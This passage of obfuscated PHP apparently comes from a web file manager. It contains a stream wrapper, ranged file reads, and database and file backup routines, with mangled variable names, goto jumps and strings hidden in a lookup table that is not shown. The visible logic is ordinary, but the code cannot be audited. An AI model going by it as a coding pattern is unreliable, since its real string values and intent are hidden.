($¿ŠŠ•éê = 0; $¿ŠŠ•éê < $²¹ğù±€; $¿ŠŠ•éê++) { if (timeFloat() - $İü“‡œã > $‹¦¥‚êĞ) { return !1; } $İÜ£é© = $this->fileSubstr($öŸÚˆÁÌ, $ğ‡Ë€»€ * $¿ŠŠ•éê, $ÓÖğù¯ã); if (!$İÜ£é©) { return !1; } $å³Øó•— .= $İÜ£é©; } $å³Øó•— .= $this->fileSubstr($öŸÚˆÁÌ, $İÃö©óà - $ÓÖğù¯ã, $ÓÖğù¯ã); return md5($å³Øó•—) . $İÃö©óà; } public function getContent($’ä›À‚«) { return $this->fileSubstr($’ä›À‚«); } public function fileSubstr($ÑÕÇœµğ, $ÕŞöˆ”Å = 0, $î®ØªäÌ = -1) { $úçÀíÂ§ =& $_SERVER[ •ŒÓîÆ]; $¯¯¨âÆ• = $this->info($ÑÕÇœµğ); if (!$¯¯¨âÆ• || !$¯¯¨âÆ•[$úçÀíÂ§[218]] && $¯¯¨âÆ•[$úçÀíÂ§[78]] > 1024 * 1024 * 10) { return !1; } if ($î®ØªäÌ === -1) { $î®ØªäÌ = $¯¯¨âÆ•[$úçÀíÂ§[78]]; } if ($î®ØªäÌ == 0) { return $úçÀíÂ§[12]; } $Ö©õ­„ˆ = array($úçÀíÂ§[1531] . $ÕŞöˆ”Å . $úçÀíÂ§[823] . ($ÕŞöˆ”Å + $î®ØªäÌ - 1)); $é´¦ ÔÆ = url_request($ÑÕÇœµğ, $úçÀíÂ§[247], !1, $Ö©õ­„ˆ, !1, !1, 30); return $é´¦ ÔÆ[$úçÀíÂ§[1243]] ? $é´¦ ÔÆ[$úçÀíÂ§[1243]] : $úçÀíÂ§[12]; } public function download($ˆå’üÌ¡, $€¶´Úï«) { Downloader::start($ˆå’üÌ¡, $€¶´Úï«); return $€¶´Úï«; } } class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_fopenCache = array(); static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($–ŞÆ‘™Ò, $Œ¬Ãö” = '') { $this->info = $this->info($–ŞÆ‘™Ò); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[ •ŒÓîÆ][86]]; $this->pathOpen = $–ŞÆ‘™Ò; if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$–ŞÆ‘™Ò])) { self::$_chunkBuffer[$–ŞÆ‘™Ò] = array(); } self::$_fopenCache[$this->pathOpen] = $this; return $this->info ? !0 : !1; } function stream_read($×ÌİĞŞ¡) { $›ÛÙšÅó = $this->fileSubstr($this->pose, $×ÌİĞŞ¡); $this->pose += strlen($›ÛÙšÅó); return $›ÛÙšÅó; } public function stream_tell() { return $this->pose; } public function stream_seek($ ÍÆöÇ, $ÒÍ¬Ô²­) { $†›íŸİ =& $_SERVER[ •ŒÓîÆ]; if ($ÒÍ¬Ô²­ == SEEK_SET) { $this->pose = $ ÍÆöÇ; } else { if ($ÒÍ¬Ô²­ == SEEK_CUR) { $this->pose += $ ÍÆöÇ; } else { if ($ÒÍ¬Ô²­ == SEEK_END) { $this->pose = $this->info[$†›íŸİ[78]] + intval($ ÍÆöÇ); } } } if ($ ÍÆöÇ < 0) { $this->pose = $this->info[$†›íŸİ[78]] + $ ÍÆöÇ; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[ •ŒÓîÆ][78]]; } public function stream_close() { unset(self::$_fopenCache[$this->pathOpen]); return !0; } public function url_stat($°åÃŠï, $Ê…Ø³š†) { $µı§ç« =& $_SERVER[ •ŒÓîÆ]; $ŠÈ¶‹ó¶ = $this->info($°åÃŠï); return array($µı§ç«[1532] => 0, $µı§ç«[1533] => 0, $µı§ç«[16] => 32768 + 511, $µı§ç«[1534] => 0, $µı§ç«[1535] => 0, $µı§ç«[1536] => 0, $µı§ç«[1537] => 0, $µı§ç«[78] => $ŠÈ¶‹ó¶[$µı§ç«[78]], $µı§ç«[1538] => $ŠÈ¶‹ó¶[$µı§ç«[1404]], $µı§ç«[1494] => $ŠÈ¶‹ó¶[$µı§ç«[87]], $µı§ç«[1493] => $ŠÈ¶‹ó¶[$µı§ç«[217]], $µı§ç«[1539] => 0, $µı§ç«[1540] => 0); } static $fileInfo = array(); public function info($ä­ëÏÇÙ) { $éÆùŞêŞ = $_SERVER[ •ŒÓîÆ][1541]; if (isset(self::$fileInfo[$ä­ëÏÇÙ])) { return self::$fileInfo[$ä­ëÏÇÙ]; } if (substr($ä­ëÏÇÙ, 0, strlen($éÆùŞêŞ)) != $éÆùŞêŞ) { return !1; } self::$fileInfo[$ä­ëÏÇÙ] = IO::info(substr($ä­ëÏÇÙ, strlen($éÆùŞêŞ))); return self::$fileInfo[$ä­ëÏÇÙ]; } public static function read($¹äÌí¦À, $ïˆ¸ª÷Ä, $ÎŠÂÛĞ) { if (!isset(self::$_fopenCache[$¹äÌí¦À])) { $¹îø”¼Ş = new StreamWrapperIO(); $¹îø”¼Ş->stream_open($¹äÌí¦À); self::$_fopenCache[$¹äÌí¦À] = $¹îø”¼Ş; } $¹îø”¼Ş = self::$_fopenCache[$¹äÌí¦À]; return $¹îø”¼Ş->fileSubstr($ïˆ¸ª÷Ä, $ÎŠÂÛĞ); } public static function _read($ˆ—ÁÔÉ, $×Ø«öÌ¤, $­Ñä÷È‘) { $ùáÙğ€Ó =& $_SERVER[ •ŒÓîÆ]; $“Ö¥½Õ• = fopen($ˆ—ÁÔÉ, $ùáÙğ€Ó[1408]); if (!$“Ö¥½Õ•) { return $ùáÙğ€Ó[12]; } $ÛíÊÏåö = 8192; fseek($“Ö¥½Õ•, $×Ø«öÌ¤, SEEK_SET); $ÜÂâÕÀ– = $ùáÙğ€Ó[12]; $ÒñÆÔ¬ş = 0; while ($ÒñÆÔ¬ş < $­Ñä÷È‘) { $ë‹ßÚšß = min($ÛíÊÏåö, $­Ñä÷È‘ - $ÒñÆÔ¬ş); $ÜÂâÕÀ– .= fread($“Ö¥½Õ•, $ë‹ßÚšß); $ÒñÆÔ¬ş += $ë‹ßÚšß; } fclose($“Ö¥½Õ•); return $ÜÂâÕÀ–; } public function fileSubstr($Û´ëÅíİ, $ŸçÄÖà”) { $½Óˆî·º =& $_SERVER[ •ŒÓîÆ]; $ËüÁÌì = $this->info[$½Óˆî·º[78]]; $æÖÂßÊú = $Û´ëÅíİ; $ÉÈ‡á´Ó = $ŸçÄÖà”; if ($Û´ëÅíİ < 0) { $Û´ëÅíİ = $ËüÁÌì + $Û´ëÅíİ; } if ($ŸçÄÖà” === !1) { $ŸçÄÖà” = $ËüÁÌì - $Û´ëÅíİ; } if ($Û´ëÅíİ + $ŸçÄÖà” > $ËüÁÌì) { $ŸçÄÖà” = $ËüÁÌì - $Û´ëÅíİ; } if ($ŸçÄÖà” <= 0) { return $½Óˆî·º[12]; } if ($Û´ëÅíİ < 0 || $Û´ëÅíİ >= $ËüÁÌì || $ŸçÄÖà” <= 0 || $ŸçÄÖà” > 1024 * 1024 * 10) { throw new Exception("\x69\x6f\x46\x69\154\x65\122\145\141\x64\40\x65\162\x72\157\x72\x21\x20\163\164\x61\162\x74\75{$Û´ëÅíİ}\73\154\145\156\x67\x74\150\75{$ŸçÄÖà”}\73\40\163\151\172\145\75{$ËüÁÌì}\x3b"); } $Æóœˆ = 64 * 1024; $ä¸Ş¡ˆµ =& self::$_chunkBuffer[$this->path]; if (!$ä¸Ş¡ˆµ) { $ä¸Ş¡ˆµ = array(); } $”®òñß = 0; $‘‡òéÜ² = 0; $¿«Æ”‡ƒ = $½Óˆî·º[12]; foreach ($ä¸Ş¡ˆµ as $”®òñß => $¿«Æ”‡ƒ) { $”®òñß = intval($”®òñß); $‘‡òéÜ² = $”®òñß + strlen($¿«Æ”‡ƒ); if ($Û´ëÅíİ >= $‘‡òéÜ²) { continue; } if ($Û´ëÅíİ >= $”®òñß && $Û´ëÅíİ + $ŸçÄÖà” <= $‘‡òéÜ²) { return substr($¿«Æ”‡ƒ, $Û´ëÅíİ - $”®òñß, $ŸçÄÖà”); } break; } if (count($ä¸Ş¡ˆµ) > 100 || timeFloat() - $this->timeStart > 2.0) { $this->log($½Óˆî·º[1542], $½Óˆî·º[1543] . count($ä¸Ş¡ˆµ) . "\x3b\x73\164\x61\x72\164\75{$Û´ëÅíİ}\54\154\x65\x6e\147\x74\150\x3d{$ŸçÄÖà”}\73\x70\157\163\145\x3a{$”®òñß}\176{$‘‡òéÜ²}"); throw new Exception($½Óˆî·º[1544]); } $²ñƒÜÔ = intval($Û´ëÅíİ / $Æóœˆ) * $Æóœˆ; $ÂÓİº³Â = ceil(($Û´ëÅíİ + $ŸçÄÖà”) / $Æóœˆ) * $Æóœˆ - $²ñƒÜÔ; $óÄ½˜³ = IO::fileSubstr($this->path, $²ñƒÜÔ, $ÂÓİº³Â); $ä¸Ş¡ˆµ[$²ñƒÜÔ . $½Óˆî·º[12]] = $óÄ½˜³; ksort($ä¸Ş¡ˆµ); $Ãó·‡ºö = substr($óÄ½˜³, $Û´ëÅíİ - $²ñƒÜÔ, $ŸçÄÖà”); return $Ãó·‡ºö; } private function log($¯İìèë›, $£ªğäí) { $šø›½ € =& $_SERVER[ •ŒÓîÆ]; $å˜‡®Ş§ = timeFloat() - $this->timeStart; write_log(sprintf($šø›½ €[1545], $¯İìèë›, $this->info[$šø›½ €[32]], $å˜‡®Ş§, $£ªğäí), $šø›½ €[1223]); } } goto a’¼á¥Æë¢; aä¿ŒÉŠ†: class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { $ªäÇ÷ˆï =& $_SERVER[ •ŒÓîÆ]; $œÕÜéÔí = Backup::get(); self::$io = $œÕÜéÔí[$ªäÇ÷ˆï[792]]; self::$name = $œÕÜéÔí[$ªäÇ÷ˆï[32]]; $ëÁö©«ç = new DbManage(); $şÀÜ½Á× = $ëÁö©«ç->dbType(); $Ä¨ÎÀ„ = array($ªäÇ÷ˆï[817] => $şÀÜ½Á×, $ªäÇ÷ˆï[818] => time()); Backup::set($Ä¨ÎÀ„); $ééÙÆºï = $this->tmpFilesPath() . $ªäÇ÷ˆï[819] . self::$name . $ªäÇ÷ˆï[8]; del_dir($ééÙÆºï); mk_dir($ééÙÆºï); $ü«õ•şà = $Ø—ÙøÖò = 0; $˜‚œ£Á = new Task($ªäÇ÷ˆï[820], $ªäÇ÷ˆï[821], 0, LNG($ªäÇ÷ˆï[822]) . $ªäÇ÷ˆï[823] . LNG($ªäÇ÷ˆï[824])); try { $éâ®ç™ = $ëÁö©«ç->db()->getTables(); } catch (Exception $«ÛÎ²„¢) { $˜‚œ£Á->end(); return !1; } $éâ®ç™ = array_diff($éâ®ç™, array($ªäÇ÷ˆï[825], $ªäÇ÷ˆï[826])); foreach ($éâ®ç™ as $ÑÚğ´ëè) { $ü«õ•şà += $ëÁö©«ç->model($ÑÚğ´ëè)->count(); } $˜‚œ£Á->task[$ªäÇ÷ˆï[827]] = $ü«õ•şà; $GLOBALS[$ªäÇ÷ˆï[828]] = self::$name; foreach ($éâ®ç™ as $ÑÚğ´ëè) { $ã¶’‘£ = $ééÙÆºï . $ÑÚğ´ëè . $ªäÇ÷ˆï[829]; $ëºè¦’õ = null; if ($ÑÚğ´ëè == $ªäÇ÷ˆï[830] && (!isset($œÕÜéÔí[$ªäÇ÷ˆï[795]]) || $œÕÜéÔí[$ªäÇ÷ˆï[795]] == $ªäÇ÷ˆï[214])) { $ëºè¦’õ = self::$io; } $Ø—ÙøÖò += $ëÁö©«ç->sqlFromDb($ÑÚğ´ëè, $ã¶’‘£, $˜‚œ£Á, $ëºè¦’õ); } unset($GLOBALS[$ªäÇ÷ˆï[828]]); $˜‚œ£Á->end(); if ($Ø—ÙøÖò > $ü«õ•şà) { $ü«õ•şà = $Ø—ÙøÖò; } $Ä¨ÎÀ„ = array($ªäÇ÷ˆï[817] => $şÀÜ½Á×, $ªäÇ÷ˆï[814] => 1, $ªäÇ÷ˆï[831] => $ü«õ•şà, $ªäÇ÷ˆï[832] => $Ø—ÙøÖò, $ªäÇ÷ˆï[833] => time()); Backup::set($Ä¨ÎÀ„); if ($ü«õ•şà - $Ø—ÙøÖò > 0) { $ş­š€Ä = $ªäÇ÷ˆï[834]; if (stristr(I18n::getType(), $ªäÇ÷ˆï[835])) { $ş­š€Ä = $ªäÇ÷ˆï[836]; } write_log(array($ş­š€Ä, $Ä¨ÎÀ„), $ªäÇ÷ˆï[821]); return !1; } return !0; } private function tmpFilesPath() { $±œ¾‰ =& $_SERVER[ •ŒÓîÆ]; $Í®âÆš² = TEMP_FILES; if ($GLOBALS[$±œ¾‰[6]][$±œ¾‰[91]][$±œ¾‰[837]]) { $Í®âÆš² = $GLOBALS[$±œ¾‰[6]][$±œ¾‰[91]][$±œ¾‰[837]]; if (!mk_dir($Í®âÆš²) || !is_writable($Í®âÆš²) || !IO::mkfile($Í®âÆš² . $±œ¾‰[838])) { $Í®âÆš² = TEMP_FILES; } } return $Í®âÆš²; } } class BackupDbFile { public function __construct() { } public function index() { $‡›§ºƒœ =& $_SERVER[ •ŒÓîÆ]; $µüñòì½ = Backup::get(); $ëœÀŠìÚ = $µüñòì½[$‡›§ºƒœ[32]]; $ìî˜í…À = $this->tmpFilesPath() . "\142\141\x63\153\165\x70\137{$ëœÀŠìÚ}\x2f"; $é³ˆÙ·· = $this->backupPath($µüñòì½); if (!($é³ˆÙ·· = IO::mkdir($é³ˆÙ··))) { return !1; } $´ñïšŒ = IO::listPath($ìî˜í…À); $…©áÑÔ = isset($´ñïšŒ[$‡›§ºƒœ[85]]) ? $´ñïšŒ[$‡›§ºƒœ[85]] : array(); $¼ìÇ‰Ã¸ = array_sum(array_column($…©áÑÔ, $‡›§ºƒœ[78])); if (!$¼ìÇ‰Ã¸) { return !1; } $•Á¢Ê®ş = array($‡›§ºƒœ[839] => $¼ìÇ‰Ã¸, $‡›§ºƒœ[840] => time()); Backup::set($•Á¢Ê®ş); $ïèŒöİ = new TaskFileTransfer($‡›§ºƒœ[841], $‡›§ºƒœ[821], count($…©áÑÔ), LNG($‡›§ºƒœ[822]) . $‡›§ºƒœ[440] . LNG($‡›§ºƒœ[824]) . $‡›§ºƒœ[842]); $ïèŒöİ->task[$‡›§ºƒœ[804]] = $¼ìÇ‰Ã¸; foreach ($´ñïšŒ[$‡›§ºƒœ[85]] as $ß¶¦·Âï) { $Û±»²šİ = IO::move($ß¶¦·Âï[$‡›§ºƒœ[86]], $é³ˆÙ··); if (!$Û±»²šİ) { $ïèŒöİ->end(); $‚ó©ïÌ = IO::getLastError($‡›§ºƒœ[843] . $ß¶¦·Âï[$‡›§ºƒœ[86]] . $‡›§ºƒœ[844] . $é³ˆÙ·· . $‡›§ºƒœ[167]); write_log($‚ó©ïÌ, $‡›§ºƒœ[821]); return !1; } } $ûƒªÊÄ = new DbManage(); $©…À²ŠÔ = $ûƒªÊÄ->getSqlFile(); if (!$©…À²ŠÔ[$‡›§ºƒœ[845]] || !$©…À²ŠÔ[$‡›§ºƒœ[13]]) { return !1; } IO::move($©…À²ŠÔ[$‡›§ºƒœ[845]], $é³ˆÙ··); IO::move($©…À²ŠÔ[$‡›§ºƒœ[13]], $é³ˆÙ··); $ïèŒöİ->end(); $•Á¢Ê®ş = array($‡›§ºƒœ[846] => $¼ìÇ‰Ã¸, $‡›§ºƒœ[847] => time()); Backup::set($•Á¢Ê®ş); return !0; } private function backupPath($¦Çš©‰›) { $ºö§¼Ö¿ =& $_SERVER[ •ŒÓîÆ]; $ æó“ = $¦Çš©‰›[$ºö§¼Ö¿[32]]; $ì“‡îä = Model($ºö§¼Ö¿[811])->get($ºö§¼Ö¿[812]); $ùÇ²üıû = substr(md5($ºö§¼Ö¿[813] . $ì“‡îä . $ æó“), 0, 8); return "\173\x69\x6f\72{$¦Çš©‰›[$ºö§¼Ö¿[792]]}\x7d\57\144\x61\x74\x61\142\141\x73\145\57\x62\141\143\x6b\165\x70\x2f" . $ æó“ . $ºö§¼Ö¿[11] . $ùÇ²üıû; } private function tmpFilesPath() { $‚¯êËÅ =& $_SERVER[ •ŒÓîÆ]; $Šƒ×ôãŸ = TEMP_FILES; if ($GLOBALS[$‚¯êËÅ[6]][$‚¯êËÅ[91]][$‚¯êËÅ[837]]) { $Šƒ×ôãŸ = $GLOBALS[$‚¯êËÅ[6]][$‚¯êËÅ[91]][$‚¯êËÅ[837]]; if (!mk_dir($Šƒ×ôãŸ) || !is_writable($Šƒ×ôãŸ) || !IO::mkfile($Šƒ×ôãŸ . $‚¯êËÅ[838])) { $Šƒ×ôãŸ = TEMP_FILES; } } return $Šƒ×ôãŸ; } } class BackupFile { public function __construct() { } public function index() { $âÓ«ç² = Backup::get(); $ß°…€Ù = $âÓ«ç²[$_SERVER[ •ŒÓîÆ][348]][$_SERVER[ •ŒÓîÆ][216]][$_SERVER[ •ŒÓîÆ][520]]; $•Õ–¹œ = array($_SERVER[ •ŒÓîÆ][521] => array($_SERVER[ •ŒÓîÆ][848], $ß°…€Ù), $_SERVER[ •ŒÓîÆ][849] => array($_SERVER[ •ŒÓîÆ][386], $âÓ«ç²[$_SERVER[ •ŒÓîÆ][792]])); $Œıèüñ÷ = (int) Model($_SERVER[ •ŒÓîÆ][830])->where($•Õ–¹œ)->count($_SERVER[ •ŒÓîÆ][520]); $§âººˆ = (int) Model($_SERVER[ •ŒÓîÆ][830])->where($•Õ–¹œ)->sum($_SERVER[ •ŒÓîÆ][78]); $Á‰ö—‘¾ = new TaskFileTransfer($_SERVER[ •ŒÓîÆ][850], $_SERVER[ •ŒÓîÆ][821], $Œıèüñ÷, LNG($_SERVER[ •ŒÓîÆ][822]) . $_SERVER[ •ŒÓîÆ][823] . LNG($_SERVER[ •ŒÓîÆ][851])); $Á‰ö—‘¾->task[$_SERVER[ •ŒÓîÆ][804]] = $§âººˆ; $Üğ‰Êé = array($_SERVER[ •ŒÓîÆ][852] => $Œıèüñ÷, $_SERVER[ •ŒÓîÆ][853] => $§âººˆ, $_SERVER[ •ŒÓîÆ][854] => time()); Backup::set($Üğ‰Êé); $‰ßÜ»Ìğ = !0; $£¡¥ÖáÇ = $this->storeIds(); $ïÖªô = 1; $š‡”²¤ï = 1000; $ğ¢ô¼öâ = $È¯Ï®éÑ = 0; $ÜÙËËã = array(); $¦¾ÚÉĞï = $ê¯ŸÎğø = 0; do { $™Å¼íöé = $_SERVER[ •ŒÓîÆ][855]; $ÂÄ˜®›ß = Model($_SERVER[ •ŒÓîÆ][830])->where($•Õ–¹œ)->field($™Å¼íöé)->order($_SERVER[ •ŒÓîÆ][856])->selectPage($š‡”²¤ï, $ïÖªô); $øÀ©ØÀ = !empty($ÂÄ˜®›ß[$_SERVER[ •ŒÓîÆ][424]]) ? $ÂÄ˜®›ß[$_SERVER[ •ŒÓîÆ][424]] : array(); foreach ($øÀ©ØÀ as $Éò‚ÚğÍ) { if (!$this->_fileExist($Éò‚ÚğÍ, $ÜÙËËã, $£¡¥ÖáÇ)) { $Œıèüñ÷ -= 1; $§âººˆ -= (int) $Éò‚ÚğÍ[$_SERVER[ •ŒÓîÆ][78]]; write_log("\146\151\x6c\145\40\156\157\x74\x20\145\170\x69\x73\164\x2e\x66\x69\154\145\x49\x44\72{$Éò‚ÚğÍ[$_SERVER[ •ŒÓîÆ][520]]}\x2c\40\160\x61\164\150\x3a{$Éò‚ÚğÍ[$_SERVER[ •ŒÓîÆ][86]]}", $_SERVER[ •ŒÓîÆ][857]); continue; } $¥úÏ·ûÛ = $Éò‚ÚğÍ[$_SERVER[ •ŒÓîÆ][86]]; $øí·íîÓ = "\173\151\157\72{$âÓ«ç²[$_SERVER[ •ŒÓîÆ][792]]}\175" . substr($¥úÏ·ûÛ, strlen("\x7b\151\x6f\x3a{$Éò‚ÚğÍ[$_SERVER[ •ŒÓîÆ][858]]}\x7d")); if (IO::exist($øí·íîÓ)) { $Á‰ö—‘¾->updateFileEnd($Éò‚ÚğÍ[$_SERVER[ •ŒÓîÆ][32]], $Éò‚ÚğÍ[$_SERVER[ •ŒÓîÆ][78]]); } else { $øí·íîÓ = get_path_father($øí·íîÓ); IO::mkdir($øí·íîÓ); if (!IO::copy($¥úÏ·ûÛ, $øí·íîÓ, $_SERVER[ •ŒÓîÆ][859])) { write_log($_SERVER[ •ŒÓîÆ][860] . $¥úÏ·ûÛ . $_SERVER[ •ŒÓîÆ][844] . $øí·íîÓ . $_SERVER[ •ŒÓîÆ][167], $_SERVER[ •ŒÓîÆ][821]); $‰ßÜ»Ìğ = !1; break; } } $ß°…€Ù = $Éò‚ÚğÍ[$_SERVER[ •ŒÓîÆ][520]]; $È¯Ï®éÑ += 1; $ğ¢ô¼öâ += $Éò‚ÚğÍ[$_SERVER[ •ŒÓîÆ][78]]; $ê¯ŸÎğø += 1; $¦¾ÚÉĞï += $Éò‚ÚğÍ[$_SERVER[ •ŒÓîÆ][78]]; if ($ğ¢ô¼öâ >= 1024 * 1024 * 100) { $Üğ‰Êé = array($_SERVER[ •ŒÓîÆ][861] => $ß°…€Ù, $_SERVER[ •ŒÓîÆ][862] => $ê¯ŸÎğø, $_SERVER[ •ŒÓîÆ][863] => $¦¾ÚÉĞï); Backup::set($Üğ‰Êé); $ğ¢ô¼öâ = $È¯Ï®éÑ = 0; } } $Õ¹ÒğÑ = count($øÀ©ØÀ); $ïÖªô++; } while ($Õ¹ÒğÑ == $š‡”²¤ï); $Á‰ö—‘¾->end(); $Üğ‰Êé = array($_SERVER[ •ŒÓîÆ][864] => 1, $_SERVER[ •ŒÓîÆ][802] => time(), $_SERVER[ •ŒÓîÆ][816] => 1, $_SERVER[ •ŒÓîÆ][861] => $ß°…€Ù, $_SERVER[ •ŒÓîÆ][853] => $§âººˆ, $_SERVER[ •ŒÓîÆ][852] => $Œıèüñ÷, $_SERVER[ •ŒÓîÆ][865] => time()); if ($È¯Ï®éÑ) { $Üğ‰Êé[$_SERVER[ •ŒÓîÆ][862]] = $ê¯ŸÎğø; $Üğ‰Êé[$_SERVER[ •ŒÓîÆ][863]] = $¦¾ÚÉĞï; } Backup::set($Üğ‰Êé); $this->_fileFilter($ÜÙËËã); return !0; } private function _fileExist($ÔîĞ¡ê, &$Ä›È¬…Ş, $à©¾š­») { $³€Ñ‘‘ =& $_SERVER[ •ŒÓîÆ]; $Í…‡ëºÓ = $ÔîĞ¡ê[$³€Ñ‘‘[86]]; if (in_array($ÔîĞ¡ê[$³€Ñ‘‘[520]], $Ä›È¬…Ş)) { return !1; } if (!in_array($ÔîĞ¡ê[$³€Ñ‘‘[858]], $à©¾š­»)) { return !1; } if (IO::exist($Í…‡ëºÓ)) { return !0; } $¬¨É¬åÄ = get_path_father($Í…‡ëºÓ); if (IO::exist($¬¨É¬åÄ)) { $Ä›È¬…Ş[] = $ÔîĞ¡ê[$³€Ñ‘‘[520]]; return !1; } $ó¥ı¦ = array($³€Ñ‘‘[858] => $ÔîĞ¡ê[$³€Ñ‘‘[858]], $³€Ñ‘‘[86] => array($³€Ñ‘‘[437], "{$¬¨É¬åÄ}\x25")); $´İ¶Æ…µ = Model($³€Ñ‘‘[830])->where($ó¥ı¦)->field($³€Ñ‘‘[521])->select(); $Ä›È¬…Ş = array_merge($Ä›È¬…Ş, array_to_keyvalue($´İ¶Æ…µ, $³€Ñ‘‘[12], $³€Ñ‘‘[520])); return !1; } private function _fileFilter($›Ò¡ÒÕ) { $¥è¨ı™¼ =& $_SERVER[ •ŒÓîÆ]; if (empty($›Ò¡ÒÕ)) { return; } $İ¸¿¦² = array($¥è¨ı™¼[520] => array($¥è¨ı™¼[7], array_unique($›Ò¡ÒÕ))); $Õ°ÅŠ· = Model($¥è¨ı™¼[866])->where($İ¸¿¦²)->field($¥è¨ı™¼[183])->select(); foreach ($Õ°ÅŠ· as $Ş“¸ÀÏé) { Model($¥è¨ı™¼[866])->remove($Ş“¸ÀÏé[$¥è¨ı™¼[183]], !1); } } private function storeIds() { $¦®êû†ò =& $_SERVER[ •ŒÓîÆ]; $§¤º—‚ = Model($¦®êû†ò[808])->listData(); $Ú¬Ò­ä = array(); $şû¼­øÙ = $GLOBALS[$¦®êû†ò[6]][$¦®êû†ò[91]][$¦®êû†ò[867]]; foreach ($§¤º—‚ as $ã¤·¯¤´) { $ÍŒËÃ›ù = strtolower($ã¤·¯¤´[$¦®êû†ò[97]]); if (!isset($şû¼­øÙ[$ÍŒËÃ›ù])) { continue; } $åóÔÃ–Æ = $¦®êû†ò[76] . (isset($şû¼­øÙ[$ÍŒËÃ›ù]) ? $şû¼­øÙ[$ÍŒËÃ›ù] : ucfirst($ÍŒËÃ›ù)); if (!class_exists($åóÔÃ–Æ)) { continue; } $Ú¬Ò­ä[] = $ã¤·¯¤´[$¦®êû†ò[453]]; } return $Ú¬Ò­ä; } } goto a›ìÊƒÏìÄ; cÕ’†©Şùë: class TaskFileTransfer extends Task { protected function startAfter() { $½İ£¨’Å =& $_SERVER[ •ŒÓîÆ]; $Ü¢äõ™Ó =& $this->task; $this->sourceCopyFolder = !1; Hook::bind($½İ£¨’Å[1720], array($this, $½İ£¨’Å[1721])); Hook::bind($½İ£¨’Å[1264], array($this, $½İ£¨’Å[1722])); Hook::bind($½İ£¨’Å[1723], array($this, $½İ£¨’Å[1724])); Hook::bind($½İ£¨’Å[648], array($this, $½İ£¨’Å[1725])); Hook::bind($½İ£¨’Å[649], array($this, $½İ£¨’Å[1726])); Hook::bind($½İ£¨’Å[655], array($this, $½İ£¨’Å[1727])); Hook::bind($½İ£¨’Å[656], array($this, $½İ£¨’Å[1728])); Hook::bind($½İ£¨’Å[651], array($this, $½İ£¨’Å[1729])); Hook::bind($½İ£¨’Å[653], array($this, $½İ£¨’Å[1730])); Hook::bind($½İ£¨’Å[617], array($this, $½İ£¨’Å[1731])); Hook::bind($½İ£¨’Å[614], array($this, $½İ£¨’Å[1731])); Hook::bind($½İ£¨’Å[619], array($this, $½İ£¨’Å[1731])); Hook::bind($½İ£¨’Å[621], array($this, $½İ£¨’Å[1731])); Hook::bind($½İ£¨’Å[623], array($this, $½İ£¨’Å[1731])); Hook::bind($½İ£¨’Å[1732], array($this, $½İ£¨’Å[1733])); Hook::bind($½İ£¨’Å[639], array($this, $½İ£¨’Å[1734])); $this->sourceModelCopyFlag = !1; Hook::bind($½İ£¨’Å[1735], array($this, $½İ£¨’Å[1736])); Hook::bind($½İ£¨’Å[1737], array($this, $½İ£¨’Å[1738])); Hook::bind($½İ£¨’Å[1739], array($this, $½İ£¨’Å[1740])); $Ü¢äõ™Ó[$½İ£¨’Å[1741]] = LNG($½İ£¨’Å[1742]); $Ü¢äõ™Ó[$½İ£¨’Å[1743]] = 0; $Ü¢äõ™Ó[$½İ£¨’Å[1744]] = 0; $Ü¢äõ™Ó[$½İ£¨’Å[1105]] = $½İ£¨’Å[12]; $Ü¢äõ™Ó[$½İ£¨’Å[1745]] = $½İ£¨’Å[12]; $Ü¢äõ™Ó[$½İ£¨’Å[1746]] = 0; $Ü¢äõ™Ó[$½İ£¨’Å[1747]] = 0; $Ü¢äõ™Ó[$½İ£¨’Å[1748]] = 0; if (!$Ü¢äõ™Ó[$½İ£¨’Å[1585]]) { $Ü¢äõ™Ó[$½İ£¨’Å[1585]] = LNG($½İ£¨’Å[1749]); } } protected function endAfter() { $Ñ¾ş·ûÚ =& $_SERVER[ •ŒÓîÆ]; Hook::unbind($Ñ¾ş·ûÚ[1720], array($this, $Ñ¾ş·ûÚ[1721])); Hook::unbind($Ñ¾ş·ûÚ[1264], array($this, $Ñ¾ş·ûÚ[1722])); Hook::unbind($Ñ¾ş·ûÚ[1723], array($this, $Ñ¾ş·ûÚ[1724])); Hook::unbind($Ñ¾ş·ûÚ[648], array($this, $Ñ¾ş·ûÚ[1725])); Hook::unbind($Ñ¾ş·ûÚ[649], array($this, $Ñ¾ş·ûÚ[1726])); Hook::unbind($Ñ¾ş·ûÚ[655], array($this, $Ñ¾ş·ûÚ[1727])); Hook::unbind($Ñ¾ş·ûÚ[656], array($this, $Ñ¾ş·ûÚ[1728])); Hook::unbind($Ñ¾ş·ûÚ[651], array($this, $Ñ¾ş·ûÚ[1729])); Hook::unbind($Ñ¾ş·ûÚ[653], array($this, $Ñ¾ş·ûÚ[1730])); Hook::unbind($Ñ¾ş·ûÚ[617], array($this, $Ñ¾ş·ûÚ[1731])); Hook::unbind($Ñ¾ş·ûÚ[614], array($this, $Ñ¾ş·ûÚ[1731])); Hook::unbind($Ñ¾ş·ûÚ[619], array($this, $Ñ¾ş·ûÚ[1731])); Hook::unbind($Ñ¾ş·ûÚ[621], array($this, $Ñ¾ş·ûÚ[1731])); Hook::unbind($Ñ¾ş·ûÚ[623], array($this, $Ñ¾ş·ûÚ[1731])); Hook::unbind($Ñ¾ş·ûÚ[1732], array($this, $Ñ¾ş·ûÚ[1733])); Hook::unbind($Ñ¾ş·ûÚ[639], array($this, $Ñ¾ş·ûÚ[1734])); Hook::unbind($Ñ¾ş·ûÚ[1735], array($this, $Ñ¾ş·ûÚ[1736])); Hook::unbind($Ñ¾ş·ûÚ[1737], array($this, $Ñ¾ş·ûÚ[1738])); Hook::unbind($Ñ¾ş·ûÚ[1739], array($this, $Ñ¾ş·ûÚ[1740])); } public function copyMoveStart($ı¢ñˆãæ, $£ˆñãºş, $·Æ½¦î, $ˆ¾²Øàº) { $êíŒÌë‰ =& $_SERVER[ •ŒÓîÆ]; self::log($êíŒÌë‰[1750] . $£ˆñãºş . $êíŒÌë‰[72] . $ˆ¾²Øàº); $‹Æ»Ù¸œ = rtrim(TEMP_FILES, $êíŒÌë‰[8]); if (substr($£ˆñãºş, 0, strlen($‹Æ»Ù¸œ)) == $‹Æ»Ù¸œ) { return; } 